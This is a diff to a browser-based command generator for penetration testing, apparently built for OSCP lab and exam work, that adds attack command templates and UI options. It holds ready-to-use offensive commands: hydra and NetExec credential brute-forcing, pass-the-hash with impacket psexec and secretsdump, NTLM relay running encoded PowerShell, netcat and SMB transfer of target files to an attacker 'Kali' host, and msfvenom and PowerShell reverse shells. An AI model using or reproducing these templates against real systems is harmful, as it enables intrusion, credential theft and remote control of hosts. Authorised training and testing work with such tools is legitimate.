@@ -143,7 +143,14 @@
 
     .selected-row {
       display: grid;
-      grid-template-columns: repeat(6, minmax(140px, 1fr));
+      grid-template-columns:
+        minmax(120px, 0.8fr)   /* Target */
+        minmax(170px, 1.1fr)   /* User */
+        minmax(170px, 1.1fr)   /* Password */
+        minmax(190px, 1.25fr)  /* Hash */
+        minmax(100px, 0.65fr)  /* Service */
+        minmax(80px, 0.5fr)    /* Port */
+        minmax(190px, 1.25fr); /* Filename */
       gap: 12px;
     }
 
@@ -228,6 +235,40 @@
     .combo-option:hover {
       background: var(--panel);
       color: var(--accent);
+    }
+
+    .section-options {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px 16px;
+      align-items: center;
+      margin: 6px 0 14px;
+      padding: 10px;
+      background: rgba(32, 36, 46, 0.55);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+    }
+
+    .section-option {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      color: var(--muted);
+      font-size: 0.92rem;
+      margin: 0;
+    }
+
+    .section-option input[type="checkbox"] {
+      width: auto;
+      min-height: 0;
+      margin: 0;
+    }
+
+    .section-option select {
+      width: auto;
+      min-width: 116px;
+      min-height: 32px;
+      padding: 5px 8px;
     }
 
     .command-line {
@@ -429,12 +470,18 @@
 
     <div class="card">
       <h3>Users</h3>
-      <textarea id="usersInput" spellcheck="false" placeholder="administrator&#10;svc_backup"></textarea>
+      <textarea id="usersInput" spellcheck="false" placeholder="administrator&#10;svc_backup">admin
+administrator
+offsec
+      </textarea>
     </div>
 
     <div class="card">
       <h3>Passwords</h3>
-      <textarea id="passwordsInput" spellcheck="false" placeholder="Password123!&#10;Spring2026!"></textarea>
+      <textarea id="passwordsInput" spellcheck="false" placeholder="Password123!&#10;Spring2026!">lab
+password
+admin
+      </textarea>
     </div>
 
     <div class="card">
@@ -446,8 +493,13 @@
   <h2>Variables</h2>
   <div class="row">
     <div>
-      <label for="domainInput">Domain</label>
+      <label for="domainInput">Domain / FQDN</label>
       <input id="domainInput" value="domain.com" spellcheck="false" />
+    </div>
+
+    <div>
+      <label for="domainShortInput">Domain Short / NetBIOS</label>
+      <input id="domainShortInput" value="DOMAIN" spellcheck="false" />
     </div>
 
     <div>
@@ -490,6 +542,11 @@
       </div>
 
       <div>
+        <label for="portInput">Port</label>
+        <input id="portInput" value="21" spellcheck="false" />
+      </div>
+
+      <div>
         <label for="filenameSelect">Filename</label>
         <div class="combo" id="filenameCombo">
           <input id="filenameSelect" value="shell.exe" spellcheck="false" autocomplete="off" />
@@ -527,8 +584,11 @@
      *
      * Supported template variables:
      * {target}, {last}, {targetNet}, {allLastOctets}, {allChallengeDirs},
-     * {user}, {password}, {hash}, {domain}, {kaliIp}, {lport},
-     * {service}, {filename}
+     * {user}, {password}, {hash}, {domain}, {domainShort}, {kaliIp},
+     * {lport}, {service}, {port}, {filename}
+     *
+     * Section-specific options can be defined with an `options` list.
+     * Supported option types: checkbox and select.
      **************************************************************************/
 
     const SERVICES = ["SMB", "LDAP", "MSSQL", "WinRM", "WMI", "RDP", "SSH", "FTP"];
@@ -537,6 +597,7 @@
       "shell.exe",
       "ligolo-agent.exe",
       "winPEASx64.exe",
+      "linpeas.sh",
       "SharpHound.ps1",
       "PrintSpoofer64.exe",
       "nc.exe",
@@ -559,7 +620,8 @@
         title: "Nmap",
         nav: "Nmap",
         commands: [
-          { template: "sudo nmap -sV -sC -Pn -oA challenge/{last}/{last} {target}" },
+          { prefix: "Most common 1000 ports", template: "sudo nmap -v -sV -sC -Pn -oA challenge/{last}/{last} {target}" },
+          { prefix: "All ports", template: "sudo nmap -v -sV -sC -Pn -oA challenge/{last}/{last}_all {target} -p- -T4" },
           { prefix: "161 SNMP", template: "sudo nmap -sU -oA challenge/{last}/{last}_UDP {target}" }
         ]
       },
@@ -567,49 +629,81 @@
         id: "gobuster",
         title: "gobuster",
         nav: "gobuster",
+        options: [
+          { id: "gobusterPort", type: "checkbox", label: "Add :{port}" },
+          { id: "gobusterProxy", type: "checkbox", label: "Add --proxy socks5://127.0.0.1:9999" }
+        ],
         commands: [
-          { template: "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -o challenge/{last}/gobuster -x txt,pdf,config,conf,php,bak" }
+          { template: "gobuster dir -u http://{target}{gobusterPortFlag} -w /usr/share/wordlists/dirb/common.txt -o challenge/{last}/gobuster -x txt,pdf,config,conf,php,bak{gobusterProxyFlag}" }
         ]
       },
       {
         id: "hydra",
-        title: "Hydra (SSH, RDP, FTP) (-s specify port)",
+        title: "Hydra (SSH, RDP, FTP)",
         nav: "hydra",
+        options: [
+          { id: "hydraPort", type: "checkbox", label: "Add -s {port}" }
+        ],
         commands: [
-          { template: "hydra -L user.txt -P password.txt {service}://{target}" },
-          { template: "hydra -L user.txt -p '{password}' {service}://{target}" },
-          { template: "hydra -l '{user}' -P password.txt {service}://{target}" },
-          { template: "hydra -l '{user}' -p '{password}' {service}://{target}" }
+          { template: "hydra -t 1{hydraPortFlag} -L user.txt -P password.txt {service}://{target}" },
+          { template: "hydra -t 1{hydraPortFlag} -L user.txt -p '{password}' {service}://{target}" },
+          { template: "hydra -t 1{hydraPortFlag} -l '{user}' -P password.txt {service}://{target}" },
+          { template: "hydra -t 1{hydraPortFlag} -l '{user}' -p '{password}' {service}://{target}" }
         ]
       },
       {
-        id: "nxc-password",
-        title: "NetExec (nxc) - password (-X for command execution)",
-        nav: "NetExec password",
+        id: "nxc",
+        title: "NetExec (nxc) (-X 'powershell -e ' for command execution)",
+        nav: "NetExec",
+        options: [
+          { id: "nxcAuthMode", type: "select", label: "Auth", choices: [
+            { value: "password", label: "Password" },
+            { value: "hash", label: "Hash" }
+          ] },
+          { id: "nxcPort", type: "checkbox", label: "Add --port {port}" },
+          { id: "nxcLocalAuth", type: "checkbox", label: "Add --local-auth" },
+          { id: "nxcCommandExec", type: "checkbox", label: "Add -X 'powershell -e '" }
+        ],
         commands: [
-          { template: "nxc {service} {target} -u user.txt -p password.txt --continue-on-success" },
-          { template: "nxc {service} {target} -u user.txt -p '{password}' --continue-on-success" },
-          { template: "nxc {service} {target} -u '{user}' -p password.txt --continue-on-success" },
-          { template: "nxc {service} {target} -u '{user}' -p '{password}' --continue-on-success" }
+          { template: "nxc {service} {target}{nxcPortFlag} -u user.txt{nxcCredFileFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
+          { template: "nxc {service} {target}{nxcPortFlag} -u user.txt{nxcCredSingleFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
+          { template: "nxc {service} {target}{nxcPortFlag} -u '{user}'{nxcCredFileFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
+          { template: "nxc {service} {target}{nxcPortFlag} -u '{user}'{nxcCredSingleFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
+          { prefix: "SSH key file", template: "nxc ssh {target}{nxcPortFlag} -u user.txt --key-file id_ecdsa -p '{password}'{nxcLocalAuthFlag}" }
         ]
       },
       {
-        id: "nxc-hash",
-        title: "NetExec (nxc) - hash",
-        nav: "NetExec hash",
+        id: "FTP",
+        title: "FTP",
+        nav: "FTP",
         commands: [
-          { template: "nxc {service} {target} -u user.txt -H hash.txt --continue-on-success" },
-          { template: "nxc {service} {target} -u user.txt -H '{hash}' --continue-on-success" },
-          { template: "nxc {service} {target} -u '{user}' -H hash.txt --continue-on-success" },
-          { template: "nxc {service} {target} -u '{user}' -H '{hash}' --continue-on-success" }
+          { prefix: "Connect to server", template: "ftp {target} {port}" },
+          { prefix: "Credential login", template: "lftp -u '{user}','{password}' ftp://{target}:{port}" },
+          { prefix: "Anonymous login", template: "lftp -u anonymous,anonymous ftp://{target}:{port}" }
+        ]
+      },
+      {
+        id: "Smbclient",
+        title: "Smbclient",
+        nav: "Smbclient",
+        options: [
+          { id: "smbUseDomain", type: "checkbox", label: "Include domain", defaultChecked: true }
+        ],
+        commands: [
+          { prefix: "List SMB shares", template: "smbclient -L //{target} -U '{smbAuth}'" },
+          { prefix: "Connect to shares", template: "smbclient //{target} -U '{smbAuth}'" },
+          { prefix: "Execute command", template: "smbclient //{target}/<share_name> -c '<command>'" }
         ]
       },
       {
         id: "rdp",
         title: "RDP",
         nav: "RDP",
+        options: [
+          { id: "rdpDomain", type: "checkbox", label: "Add /d:{domain}" }
+        ],
         commands: [
-          { template: "xfreerdp3 /cert:ignore /v:{target} /u:'{user}' /p:'{password}' /drive:share,/home/kali/share" }
+          { template: "xfreerdp3 /cert:ignore /v:{target} /u:'{user}' /p:'{password}'{rdpDomainFlag} /drive:share,/home/kali/share" }
         ]
       },
       {
@@ -620,6 +714,24 @@
           { template: "evil-winrm -i {target} -u '{user}' -p '{password}'" },
           { template: "evil-winrm -i {target} -u '{user}' -p '{password}' -S -P 5986" },
           { template: "evil-winrm -i {target} -u '{user}' -H '{hash}'" }
+        ]
+      },
+      {
+        id: "WinPEAS",
+        title: "WinPEAS",
+        nav: "WinPEAS",
+        commands: [
+          { prefix: "Look at env, autorun, scheduled tasks, listening ports", template: ".\\winPEASx64.exe | Tee-Object winpeas.txt" },
+          { prefix: "Convert to grep", template: "iconv -f UTF-16LE -t UTF-8 winpeas.txt > winpeas-utf8.txt" },
+          { prefix: "Convert to mousepad", template: "sed -r 's/\\x1b\\[[0-9;]*m//g' winpeas-utf8.txt > wp-clean.txt" }
+        ]
+      },
+      {
+        id: "LinPEAS",
+        title: "LinPEAS",
+        nav: "LinPEAS",
+        commands: [
+          { prefix: "Look at env, autorun, scheduled tasks, listening ports", template: "./linpeas.sh 2>&1 | tee linpeas.txt" }
         ]
       },
       {
@@ -657,11 +769,21 @@
         id: "password-cracking",
         title: "Password cracking",
         nav: "Password cracking",
+        options: [
+          { id: "hashcatModule", type: "select", label: "Hashcat mode", choices: [
+            { value: "1000", label: "1000" },
+            { value: "13400", label: "13400" },
+            { value: "22921", label: "22921" }
+          ] }
+        ],
         commands: [
+          { prefix: "SSH private key passphrase", template: "ssh2john id_rsa > ssh.hash" },
+          { prefix: "KeePass password", template: "keepass2john Database.kdbx > keepass.hash" },
+          { prefix: "KeePass browse content", template: "kpcli --kdb=Database.kdbx" },
           { prefix: "john", template: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt" },
           { prefix: "", template: "john --show hashes.txt" },
-          { prefix: "hashcat", template: "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force" },
-          { prefix: "", template: "hashcat --show -m 1000 hashes.txt" }
+          { prefix: "hashcat", template: "hashcat -m {hashcatModule} hashes.txt /usr/share/wordlists/rockyou.txt --force" },
+          { prefix: "", template: "hashcat --show -m {hashcatModule} hashes.txt" }
         ]
       },
       {
@@ -669,24 +791,40 @@
         title: "Impacket",
         nav: "Impacket",
         commands: [
-          { prefix: "Local admin & ADMIN$", template: "impacket-psexec -hashes :{hash} {user}@{target}" },
-          { prefix: "", template: "impacket-wmiexec -hashes :{hash} {user}@{target}" },
+          { prefix: "Local admin & ADMIN$", template: "impacket-psexec -hashes :{hash} {domainShort}/{user}@{target}" },
+          { prefix: "", template: "impacket-wmiexec -hashes :{hash} {domainShort}/{user}@{target}" },
           { template: "impacket-secretsdump -just-dc {domain}/{user}:'{password}'@{target}" },
           { template: "impacket-secretsdump -hashes :{hash} {domain}/{user}@{target}" },
           { prefix: "SMB NTLM relay", template: "impacket-ntlmrelayx --no-http-server -smb2support -t {target} -c \"powershell -enc JABjAGwAaQBlAG4AdA...\"" }
         ]
       },
       {
-        id: "windows-enum",
-        title: "Windows enumeration",
-        nav: "Windows enumeration",
+        id: "windows-enum-local",
+        title: "Windows enumeration - Local",
+        nav: "Windows enumeration - Local",
         commands: [
-          { template: "net user /domain" },
-          { template: "net user {user} /domain" },
-          { template: "whoami /all" },
+          { template: "hostname" },
           { template: "systeminfo" },
-          { template: "net localgroup administrators" },
-          { prefix: "Password policy", template: "net accounts /domain" }
+          { template: "whoami /all" },
+          { prefix: "Environment variables", template: "set" },
+          { prefix: "Listening ports", template: "netstat -ano" },
+          { prefix: "List local users", template: "net user" },
+          { prefix: "User's group membership", template: "net user {user}" },
+          { prefix: "List local groups", template: "net localgroup" },
+          { prefix: "Local group's members", template: "net localgroup administrators" },
+          { prefix: "Password policy", template: "net accounts" }
+        ]
+      },
+      {
+        id: "windows-enum-domain",
+        title: "Windows enumeration - Domain",
+        nav: "Windows enumeration - Domain",
+        commands: [
+          { prefix: "List domain users", template: "net user /domain" },
+          { prefix: "Domain user's group membership", template: "net user {user} /domain" },
+          { prefix: "List domain groups", template: "net group /domain" },
+          { prefix: "Domain group's members", template: "net group \"Domain Admins\" /domain" },
+          { prefix: "Domain password policy", template: "net accounts /domain" }
         ]
       },
       {
@@ -738,8 +876,12 @@
         title: "Transfer files to Kali",
         nav: "Transfer files to Kali",
         commands: [
-          { prefix: "On Kali", className: "kali", template: "nc -lvnp 9001 > file.file" },
-          { prefix: "On target", className: "target", template: "cmd.exe /c \".\\nc.exe {kaliIp} 9001 < file.file\"" },
+          { prefix: "On Kali", className: "kali", template: "impacket-smbserver share . -smb2support" },
+          { prefix: "On Windows target", className: "target", template: "copy file \\\\{kaliIp}\\share\\" },
+          { prefix: "On Linux target", className: "target", template: "smbclient //{kaliIp}/share -U kali" },
+          { prefix: "", template: "put file" },
+          { prefix: "On Kali", className: "kali", template: "nc -lvnp 9001 > file" },
+          { prefix: "On target", className: "target", template: "cmd.exe /c \".\\nc.exe {kaliIp} 9001 < file\"" },
           { prefix: "", className: "target", template: "python -m http.server 80" }
         ]
       },
@@ -760,6 +902,14 @@
         nav: "msfvenom",
         commands: [
           { template: "msfvenom -p windows/x64/shell_reverse_tcp LPORT={lport} LHOST={kaliIp} -f exe -o shell.exe" }
+        ]
+      },
+      {
+        id: "PowerShell-rev-shell",
+        title: "PowerShell reverse shell",
+        nav: "PowerShell reverse shell",
+        commands: [
+          { template: "python mkpsrevshell.py {kaliIp} {lport}" }
         ]
       },
       {
@@ -791,9 +941,11 @@
       "passwordsInput",
       "hashesInput",
       "domainInput",
+      "domainShortInput",
       "kaliIpInput",
       "lportInput",
       "serviceSelect",
+      "portInput",
       "filenameSelect"
     ];
 
@@ -884,6 +1036,8 @@
     function renderCommandSections() {
       const container = document.getElementById("commandsContainer");
       const html = COMMAND_SECTIONS.map((section, sectionIndex) => {
+        const options = renderSectionOptions(section);
+
         const lines = section.commands.map((command, commandIndex) => {
           const commandId = commandIdFor(sectionIndex, commandIndex);
           const prefix = command.prefix !== undefined
@@ -901,12 +1055,47 @@
         return `
           <div class="command-group" id="${section.id}">
             <h3>${escapeHtml(section.title)}</h3>
+            ${options}
             ${lines}
             <span class="copy-status" id="status-${section.id}"></span>
           </div>`;
       }).join("");
 
       container.innerHTML = html;
+    }
+
+    function renderSectionOptions(section) {
+      if (!section.options || section.options.length === 0) {
+        return "";
+      }
+
+      const controls = section.options.map(option => {
+        const optionId = optionElementId(option.id);
+        const label = escapeHtml(option.label || option.id);
+
+        if (option.type === "select") {
+          const choices = (option.choices || []).map(choice => {
+            const value = typeof choice === "string" ? choice : choice.value;
+            const text = typeof choice === "string" ? choice : choice.label;
+            return `<option value="${escapeHtml(value)}">${escapeHtml(text)}</option>`;
+          }).join("");
+
+          return `
+            <label class="section-option" for="${optionId}">
+              <span>${label}</span>
+              <select id="${optionId}" data-section-option="${escapeHtml(option.id)}">${choices}</select>
+            </label>`;
+        }
+
+        const checked = option.defaultChecked ? "checked" : "";
+        return `
+          <label class="section-option" for="${optionId}">
+            <input id="${optionId}" type="checkbox" data-section-option="${escapeHtml(option.id)}" ${checked} />
+            <span>${label}</span>
+          </label>`;
+      }).join("");
+
+      return `<div class="section-options">${controls}</div>`;
     }
 
     function commandIdFor(sectionIndex, commandIndex) {
@@ -917,6 +1106,30 @@
       return COMMAND_SECTIONS.flatMap((section, sectionIndex) =>
         section.commands.map((command, commandIndex) => commandIdFor(sectionIndex, commandIndex))
       );
+    }
+
+    function optionElementId(optionId) {
+      return `option-${optionId}`;
+    }
+
+    function getOptionIds() {
+      return COMMAND_SECTIONS.flatMap(section =>
+        (section.options || []).map(option => optionElementId(option.id))
+      );
+    }
+
+    function getStateIds() {
+      return [...stateKeys, ...getOptionIds()];
+    }
+
+    function optionChecked(optionId) {
+      const element = document.getElementById(optionElementId(optionId));
+      return element ? element.checked : false;
+    }
+
+    function optionValue(optionId, fallback) {
+      const element = document.getElementById(optionElementId(optionId));
+      return element ? element.value : fallback;
     }
 
     function updateDropdowns() {
@@ -943,7 +1156,7 @@
       const last = target !== "<target_ip>" ? lastOctet(target) : "<last_octet>";
       const challengeDirs = targets.map(ip => `challenge/${lastOctet(ip)}`);
 
-      return {
+      const values = {
         target,
         last,
         targetNet: target !== "<target_ip>" ? cidr24Network(target) : "<target_network>/24",
@@ -953,11 +1166,31 @@
         password: selectedOrFallback("passwordSelect", "<password>"),
         hash: selectedOrFallback("hashSelect", "<hash>"),
         domain: selectedOrFallback("domainInput", "<domain>"),
+        domainShort: selectedOrFallback("domainShortInput", "<domain_short>"),
         kaliIp: selectedOrFallback("kaliIpInput", "<kali_ip>"),
         lport: selectedOrFallback("lportInput", "<LPORT>"),
         service: selectedOrFallback("serviceSelect", "SMB").toLowerCase(),
+        port: selectedOrFallback("portInput", "<port>"),
         filename: selectedOrFallback("filenameSelect", "<filename>")
       };
+
+      const nxcAuthMode = optionValue("nxcAuthMode", "password");
+
+      values.hydraPortFlag = optionChecked("hydraPort") ? ` -s ${values.port}` : "";
+      values.rdpDomainFlag = optionChecked("rdpDomain") ? ` /d:${values.domain}` : "";
+      values.nxcPortFlag = optionChecked("nxcPort") ? ` --port ${values.port}` : "";
+      values.nxcLocalAuthFlag = optionChecked("nxcLocalAuth") ? " --local-auth" : "";
+      values.nxcCommandExecFlag = optionChecked("nxcCommandExec") ? " -X 'powershell -e '" : "";
+      values.nxcCredFileFlag = nxcAuthMode === "hash" ? " -H hashes.txt" : " -p password.txt";
+      values.nxcCredSingleFlag = nxcAuthMode === "hash" ? ` -H '${values.hash}'` : ` -p '${values.password}'`;
+      values.smbAuth = optionChecked("smbUseDomain")
+        ? `${values.domainShort}\\${values.user}%${values.password}`
+        : `${values.user}%${values.password}`;
+      values.gobusterPortFlag = optionChecked("gobusterPort") ? `:${values.port}` : "";
+      values.gobusterProxyFlag = optionChecked("gobusterProxy") ? " --proxy socks5://127.0.0.1:9999" : "";
+      values.hashcatModule = optionValue("hashcatModule", "1000");
+
+      return values;
     }
 
     function renderTemplate(template, values) {
@@ -1064,17 +1297,31 @@
     }
 
     function saveState() {
-      stateKeys.forEach(id => {
+      getStateIds().forEach(id => {
         const element = document.getElementById(id);
-        localStorage.setItem("oscp_" + id, element.value);
+        if (!element) {
+          return;
+        }
+
+        const value = element.type === "checkbox" ? String(element.checked) : element.value;
+        localStorage.setItem("oscp_" + id, value);
       });
     }
 
     function loadState() {
-      stateKeys.forEach(id => {
+      getStateIds().forEach(id => {
         const saved = localStorage.getItem("oscp_" + id);
         if (saved !== null) {
           const element = document.getElementById(id);
+          if (!element) {
+            return;
+          }
+
+          if (element.type === "checkbox") {
+            element.checked = saved === "true";
+            return;
+          }
+
           const isSelect = element.tagName.toLowerCase() === "select";
           const optionExists = isSelect && Array.from(element.options).some(option => option.value === saved);
 
@@ -1087,7 +1334,7 @@
 
     function bindEvents() {
       const watchedIds = [
-        ...stateKeys,
+        ...getStateIds(),
         "targetSelect",
         "userSelect",
         "passwordSelect",
